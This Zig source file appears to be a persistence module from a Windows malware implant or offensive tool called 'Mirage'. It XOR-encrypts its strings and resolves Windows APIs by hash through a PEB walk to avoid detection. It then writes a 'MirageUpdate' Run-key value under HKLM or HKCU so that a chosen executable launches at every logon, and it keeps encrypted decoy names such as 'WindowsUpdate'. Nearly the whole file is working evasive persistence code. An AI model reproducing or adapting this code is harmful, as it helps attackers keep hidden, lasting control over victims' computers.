const std = @import("std");
const types = @import("../types/types.zig");
const hash = @import("../types/hash.zig");
const peb_walk = @import("../types/peb_walk.zig");
const export_resolve = @import("../types/export_resolve.zig");

const E = struct {
    pub const advapi32 = hash.xorEncrypt("advapi32.dll");
    pub const hklm_run = hash.xorEncrypt("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    pub const hkcu_run = hash.xorEncrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
    pub const val_wupdate = hash.xorEncrypt("WindowsUpdate");
    pub const val_gupdate = hash.xorEncrypt("GoogleUpdate");
};

const VAL_NAME: []const u8 = "MirageUpdate";
const HKLM: types.HANDLE = @ptrFromInt(@as(usize, 0x80000002));
const HKCU: types.HANDLE = @ptrFromInt(@as(usize, 0x80000001));

fn loadAdvapi32() ?types.PVOID {
    const ntdll = peb_walk.getModuleByHash(hash.encryptedHashModule("ntdll.dll")) orelse return null;
    const ldr_load: *const fn (?*u16, ?*u32, *types.UNICODE_STRING, *types.PVOID) callconv(.winapi) types.NTSTATUS = @ptrCast(@alignCast(
        export_resolve.getFunctionByHash(ntdll, hash.encryptedHashFunc("LdrLoadDll")) orelse return null,
    ));
    const mod_hash = hash.encryptedHashModule("advapi32.dll");
    if (peb_walk.getModuleByHash(mod_hash)) |base| return base;
    var wide_buf: [128]u8 = undefined;
    const name: []const u8 = "advapi32.dll";
    for (name, 0..) |c, i| {
        wide_buf[i * 2] = c;
        wide_buf[i * 2 + 1] = 0;
    }
    wide_buf[name.len * 2] = 0;
    wide_buf[name.len * 2 + 1] = 0;
    var unicode_str = types.UNICODE_STRING{
        .Length = @as(u16, @intCast(name.len * 2)),
        .MaximumLength = @as(u16, @intCast(name.len * 2 + 2)),
        .Buffer = @as([*]u16, @ptrCast(@alignCast(&wide_buf))),
    };
    var base: types.PVOID = undefined;
    if (ldr_load(null, null, &unicode_str, &base) < 0) return null;
    return base;
}

fn setRegistryString(hkey: types.HANDLE, subkey: []const u8, value_name: []const u8, value: []const u8) bool {
    const advapi32 = loadAdvapi32() orelse return false;
    const RegCreateKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCreateKeyExW")) orelse return false;
    const RegSetValueExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegSetValueExW")) orelse return false;
    const RegCreateKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, reserved: u32, class: ?[*:0]const u16, options: u32, access: u32, sec_attr: ?*const anyopaque, result: *types.HANDLE, disposition: ?*u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegCreateKeyExW));
    const RegSetValueExWFn: *const fn (hkey: types.HANDLE, name: ?[*:0]const u16, reserved: u32, typ: u32, data: [*]const u8, size: u32) callconv(.winapi) u32 = @ptrCast(@alignCast(RegSetValueExW));
    var subkey_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
    subkey_us[i] = 0;
    var name_us: [128]u16 = undefined;
    var j: usize = 0;
    while (j < value_name.len and j < 127) : (j += 1) name_us[j] = value_name[j];
    name_us[j] = 0;
    var key: types.HANDLE = undefined;
    const cr_status = RegCreateKeyExWFn(hkey, subkey_us[0 .. i + 1 :0], 0, null, 0, 0x02000000, null, &key, null);
    if (cr_status != 0) return false;
    var val_bytes: [1024]u8 = undefined;
    for (value, 0..) |c, k| {
        if (k < val_bytes.len - 2) {
            val_bytes[k * 2] = c;
            val_bytes[k * 2 + 1] = 0;
        }
    }
    const sv_status = RegSetValueExWFn(key, name_us[0 .. j + 1 :0], 0, 1, @as([*]const u8, @ptrCast(&val_bytes)), @as(u32, @intCast(value.len * 2 + 2)));
    _ = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCloseKey"));
    const RegCloseKeyFn: *const fn (key: types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCloseKey")) orelse return false));
    _ = RegCloseKeyFn(key);
    return sv_status == 0;
}

fn deleteRegistryValue(hkey: types.HANDLE, subkey: []const u8, value_name: []const u8) bool {
    const advapi32 = loadAdvapi32() orelse return false;
    const RegOpenKeyExW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegOpenKeyExW")) orelse return false;
    const RegDeleteValueW = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegDeleteValueW")) orelse return false;
    const RegOpenKeyExWFn: *const fn (hkey: types.HANDLE, subkey: ?[*:0]const u16, options: u32, access: u32, result: *types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(RegOpenKeyExW));
    const RegDeleteValueWFn: *const fn (hkey: types.HANDLE, name: ?[*:0]const u16) callconv(.winapi) u32 = @ptrCast(@alignCast(RegDeleteValueW));
    var subkey_us: [512]u16 = undefined;
    var i: usize = 0;
    while (i < subkey.len and i < 511) : (i += 1) subkey_us[i] = subkey[i];
    subkey_us[i] = 0;
    var name_us: [128]u16 = undefined;
    var j: usize = 0;
    while (j < value_name.len and j < 127) : (j += 1) name_us[j] = value_name[j];
    name_us[j] = 0;
    var key: types.HANDLE = undefined;
    const ok_status = RegOpenKeyExWFn(hkey, subkey_us[0 .. i + 1 :0], 0, 0x02000000, &key);
    if (ok_status != 0) return false;
    const dv_status = RegDeleteValueWFn(key, name_us[0 .. j + 1 :0]);
    _ = export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCloseKey"));
    const RegCloseKeyFn: *const fn (key: types.HANDLE) callconv(.winapi) u32 = @ptrCast(@alignCast(export_resolve.getFunctionByHash(advapi32, hash.encryptedHashFunc("RegCloseKey")) orelse return false));
    _ = RegCloseKeyFn(key);
    return dv_status == 0;
}

pub fn install(exe_path: []const u8) bool {
    var tmp_hklm: [E.hklm_run.len]u8 = undefined;
    var tmp_hkcu: [E.hkcu_run.len]u8 = undefined;
    hash.xorDecrypt(&E.hklm_run, &tmp_hklm);
    hash.xorDecrypt(&E.hkcu_run, &tmp_hkcu);
    if (setRegistryString(HKLM, tmp_hklm[0..], VAL_NAME, exe_path)) return true;
    if (setRegistryString(HKCU, tmp_hkcu[0..], VAL_NAME, exe_path)) return true;
    return false;
}

pub fn uninstall() bool {
    var tmp_hklm: [E.hklm_run.len]u8 = undefined;
    var tmp_hkcu: [E.hkcu_run.len]u8 = undefined;
    hash.xorDecrypt(&E.hklm_run, &tmp_hklm);
    hash.xorDecrypt(&E.hkcu_run, &tmp_hkcu);
    const lm = deleteRegistryValue(HKLM, tmp_hklm[0..], VAL_NAME);
    const cu = deleteRegistryValue(HKCU, tmp_hkcu[0..], VAL_NAME);
    return lm or cu;
}

pub fn isInstalled() bool {
    return false;
}

test "registry install returns bool" {
    _ = install("C:\\test.exe");
}

test "registry uninstall returns bool" {
    _ = uninstall();
}
